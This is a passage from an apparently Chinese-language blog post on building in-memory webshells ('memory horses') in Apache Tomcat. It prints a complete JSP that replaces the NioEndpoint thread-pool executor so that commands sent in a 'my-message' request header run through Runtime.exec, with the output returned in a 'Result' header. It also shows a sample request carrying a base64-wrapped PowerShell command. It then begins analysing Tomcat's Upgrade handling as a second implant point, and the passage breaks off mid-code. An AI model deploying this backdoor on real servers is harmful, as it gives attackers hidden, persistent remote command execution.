response.addHeader(<span class="string">&quot;Result&quot;</span>, res);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>由于 <code>Response</code> 中的 <code>buffer</code> 不好扩容，并且后面可能出现覆盖等问题，因此这里不将回显数据放到响应体里面。</p>
<p>另外将回显内容放到响应头中会存在字符限制。为了避免在 Windows 下执行命令结果出现下面这种报错：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">警告: The HTTP response header [Result] with value [ ���</span><br></pre></td></tr></table></figure></div>

<p>我们需要将结果 base64 编码一下：</p>
<div class="code-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">my-message</span><span class="punctuation">: </span>powershell -NoProfile -Command &quot;[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((cmd /c ipconfig | Out-String)))&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>完整代码如下：</p>
<div class="code-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.net.NioEndpoint&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.threads.ThreadPoolExecutor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.TimeUnit&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.BlockingQueue&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.ThreadFactory&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.ByteBuffer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.charset.StandardCharsets&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getField</span><span class="params">(Object object, String fieldName)</span> &#123;</span><br><span class="line">        Field declaredField;</span><br><span class="line">        Class&lt;?&gt; clazz = object.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                declaredField = clazz.getDeclaredField(fieldName);</span><br><span class="line">                declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> declaredField.get(object);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException ignored) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getStandardService</span><span class="params">()</span> &#123;</span><br><span class="line">        Thread[] threads = (Thread[]) <span class="built_in">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">            <span class="keyword">if</span> (thread == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((thread.getName().contains(<span class="string">&quot;Acceptor&quot;</span>))) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> <span class="built_in">this</span>.getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">nioEndPoint</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    nioEndPoint = getField(target, <span class="string">&quot;endpoint&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (nioEndPoint == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        nioEndPoint = getField(target, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (nioEndPoint == <span class="literal">null</span>)</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        <span class="keyword">return</span> nioEndPoint;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> nioEndPoint;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">threadexcutor</span> <span class="keyword">extends</span> <span class="title class_">ThreadPoolExecutor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">MY_MESSAGE</span> <span class="operator">=</span> <span class="string">&quot;my-message&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">threadexcutor</span><span class="params">(<span class="type">int</span> corePoolSize, <span class="type">int</span> maximumPoolSize, <span class="type">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getRequest</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (thread != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> thread.getName();</span><br><span class="line">                        <span class="keyword">if</span> (threadName.contains(<span class="string">&quot;Acceptor&quot;</span>)) &#123;</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (target <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    Object[] objects = (Object[]) getField(getField(getField(target, <span class="string">&quot;endpoint&quot;</span>), <span class="string">&quot;nioChannels&quot;</span>), <span class="string">&quot;stack&quot;</span>);</span><br><span class="line">                                    <span class="type">ByteBuffer</span> <span class="variable">heapByteBuffer</span> <span class="operator">=</span> (ByteBuffer) getField(getField(objects[<span class="number">0</span>], <span class="string">&quot;appReadBufHandler&quot;</span>), <span class="string">&quot;byteBuffer&quot;</span>);</span><br><span class="line">                                    <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(heapByteBuffer.array(), StandardCharsets.UTF_8);</span><br><span class="line"></span><br><span class="line">                                    <span class="keyword">if</span> (data.contains(MY_MESSAGE)) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> data.substring(</span><br><span class="line">                                                data.indexOf(MY_MESSAGE) + MY_MESSAGE.length() + <span class="number">1</span>,</span><br><span class="line">                                                data.indexOf(<span class="string">&quot;\r&quot;</span>, data.indexOf(MY_MESSAGE)) - <span class="number">1</span></span><br><span class="line">                                        );</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getResponse</span><span class="params">(String res)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (thread != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> thread.getName();</span><br><span class="line">                        <span class="keyword">if</span> (threadName.contains(<span class="string">&quot;Acceptor&quot;</span>)) &#123;</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (target <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    ArrayList&lt;?&gt; objects = (ArrayList&lt;?&gt;) getField(getField(getField(getField(target, <span class="string">&quot;endpoint&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>), <span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                                    <span class="keyword">for</span> (Object tmp_object : objects) &#123;</span><br><span class="line">                                        <span class="type">RequestInfo</span> <span class="variable">request</span> <span class="operator">=</span> (RequestInfo) tmp_object;</span><br><span class="line">                                        <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) getField(getField(request, <span class="string">&quot;req&quot;</span>), <span class="string">&quot;response&quot;</span>);</span><br><span class="line">                                        response.addHeader(<span class="string">&quot;Result&quot;</span>, res);</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(Runnable command)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> getRequest();</span><br><span class="line">            <span class="keyword">if</span> (cmd.length() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> rt.exec(cmd);</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line"></span><br><span class="line">                    <span class="type">InputStreamReader</span> <span class="variable">resultReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in);</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">stdInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(resultReader);</span><br><span class="line">                    <span class="type">StringBuilder</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="keyword">while</span> ((tmp = stdInput.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        s.append(tmp);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (!s.toString().isEmpty()) &#123;</span><br><span class="line">                        getResponse(s.toString());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException ignored) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.execute(command, <span class="number">0L</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">NioEndpoint</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> (NioEndpoint) getStandardService();</span><br><span class="line">    <span class="type">ThreadPoolExecutor</span> <span class="variable">exec</span> <span class="operator">=</span> (ThreadPoolExecutor) getField(nioEndpoint, <span class="string">&quot;executor&quot;</span>);</span><br><span class="line">    <span class="type">threadexcutor</span> <span class="variable">exe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">threadexcutor</span>(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());</span><br><span class="line">    nioEndpoint.setExecutor(exe);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>

<h4 id="Upgrade-型内存马"><a href="#Upgrade-型内存马" class="headerlink" title="Upgrade 型内存马"></a>Upgrade 型内存马</h4><p>除了 EndPoint 下的 Executor，实际上 Processor 中也能找到内存马的植入点。</p>
<p>Processor 负责处理字节流生成 Tomcat Request 对象，将 Tomcat Request 对象传递给 Adapter。其实就是处理 HTTP 请求的，对应的类为 <code>org.apache.coyote.AbstractProcessorLight</code>。</p>
<p>Tomcat 在处理请求时，<code>http-nio-8080-exec-*</code> 线程有如下调用栈：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">service:553, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:63, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:934, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1690, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:52, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure></div>

<p>在 <code>org.apache.coyote.http11.Http11Processor#service</code> 函数中针对请求头包含 <code>Upgrade</code> 字段的情况有如下判断：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 是否请求了 HTTP/1.1 协议升级？</span></span><br><span class="line"><span class="comment">// 规范要求：客户端必须在 Connection 头里带上 &quot;Upgrade&quot; 标记，才允许走 Upgrade 流程。</span></span><br><span class="line"><span class="keyword">if</span> (isConnectionToken(request.getMimeHeaders(), <span class="string">&quot;upgrade&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取目标协议名（例如 &quot;websocket&quot;、&quot;h2c&quot;、&quot;h2&quot; 等），来自 Upgrade 头。</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">requestedProtocol</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Upgrade&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 按协议名在当前连接器/协议处理器中查找对应的升级实现。</span></span><br><span class="line">    <span class="comment">// 没有匹配实现就不支持升级（保持普通 HTTP/1.1 处理）。</span></span><br><span class="line">    <span class="type">UpgradeProtocol</span> <span class="variable">upgradeProtocol</span> <span class="operator">=</span> protocol.getUpgradeProtocol(requestedProtocol);</span><br><span class="line">    <span class="keyword">if</span> (upgradeProtocol != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 由具体的 UpgradeProtocol 再做一次校验：</span></span><br><span class="line">        <span class="comment">// 检查方法/必需首部/版本等前置条件是否满足（不满足则不升级）。</span></span><br><span class="line">        <span class="keyword">if</span> (upgradeProtocol.accept(request)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 条件满足，进入升级流程：</span></span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>isConnectionToken</code> 函数会判断请求头中的 <code>Connection</code> 字段中是否包含 <code>Upgrade</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断 HTTP/1.1 的 Connection 头里是否包含指定的“连接选项”标记（如 &quot;close&quot;、&quot;keep-alive&quot;、&quot;upgrade&quot; 等）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：</span></span><br><span class="line"><span class="comment"> * - Connection 头可能出现多次，且每个值里可以用逗号分隔多个标记；本方法会把所有同名头的标记合并后再判断。</span></span><br><span class="line"><span class="comment"> * - 解析由 TokenList 完成；遇到格式错误可能抛 IOException。</span></span><br><span class="line"><span class="comment"> * - 实际比较通常大小写不敏感（TokenList 会做规范化），稳妥起见传入的小写 token 更安全，例如 &quot;close&quot;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> headers 当前请求/响应的头集合</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> token   要检查的标记（建议小写，例如 &quot;close&quot;）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 存在则返回 true；不存在或没有 Connection 头返回 false</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException 解析头部过程中出现语法错误时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isConnectionToken</span><span class="params">(MimeHeaders headers, String token)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 快速路径：如果根本没有 Connection 头，直接返回 false，避免后续解析开销</span></span><br><span class="line">    <span class="type">MessageBytes</span> <span class="variable">connection</span> <span class="operator">=</span> headers.getValue(Constants.CONNECTION);</span><br><span class="line">    <span class="keyword">if</span> (connection == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用于收集解析出的所有标记；Set 去重，也便于后面 contains 判断</span></span><br><span class="line">    Set&lt;String&gt; tokens = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从“所有” Connection 头的值里解析逗号分隔的标记列表，填充到 tokens</span></span><br><span class="line">    <span class="comment">// 例如：Connection: keep-alive, Upgrade</span></span><br><span class="line">    <span class="comment">//      Connection: close</span></span><br><span class="line">    <span class="comment">// 最终 tokens 里会包含 &#123;&quot;keep-alive&quot;,&quot;upgrade&quot;,&quot;close&quot;&#125;（实际大小写由解析器规范化）</span></span><br><span class="line">    TokenList.parseTokenList(headers.values(Constants.CONNECTION), tokens);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断是否包含目标标记（建议传入小写以匹配解析后的规范化结果）</span></span><br><span class="line">    <span class="keyword">return</span> tokens.contains(token);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果 <code>Connection</code> 字段的值中存在 <code>Upgrade</code> 则调用 <code>org.apache.coyote.http11.AbstractHttp11Protocol#getUpgradeProtocol</code> 根据请求头中 <code>Upgrade</code> 字段的值寻找对应的 <code>org.apache.coyote.UpgradeProtocol</code>。这里实际上是从 <code>httpUpgradeProtocols</code> 字段中根据协议名查找的值。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过 HTTP Upgrade 机制由 Tomcat 内置支持的协议表。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * key：协议名（来自请求头 Upgrade，例如 &quot;websocket&quot;、&quot;h2c&quot; 等）</span></span><br><span class="line"><span class="comment"> * value：对应的 UpgradeProtocol 实现（处理具体的协议切换与后续通信）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：该 Map 一般在初始化阶段填充，运行期只读访问，因此使用 HashMap 即可；</span></span><br><span class="line"><span class="comment"> *      若需要运行期动态注册/移除协议，应在外层做好并发控制。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, UpgradeProtocol&gt; httpUpgradeProtocols = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 按协议名查找已注册的 UpgradeProtocol。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> upgradedName  Upgrade 请求头中的协议名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>              匹配的 UpgradeProtocol；未注册则返回 null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> 